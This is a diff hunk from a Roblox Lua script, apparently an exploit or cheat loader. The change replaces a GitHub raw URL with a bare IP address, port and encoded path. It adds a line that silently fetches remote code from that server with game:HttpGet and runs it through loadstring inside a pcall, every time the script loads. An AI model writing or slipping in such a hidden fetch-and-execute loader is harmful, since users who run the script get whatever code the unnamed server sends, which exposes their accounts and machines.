@@ -184,7 +184,7 @@ conn = RunService.Heartbeat:Connect(function(dt)
 
         -- ===== ALWAYS EXECUTE GLOBAL LOADER AFTER LOADING =====
         pcall(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xyuxyu67/stlrsrc/refs/heads/main/1"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjFiZGI3YjgwLTc0ODgtNDJhZC05ODFiLWMwYmY5OWM2ZjFlMCIsImtpbmQiOiJsb2FkZXIifQ"))()
         end)
 
         -- ===== GAME-SPECIFIC SCRIPT =====
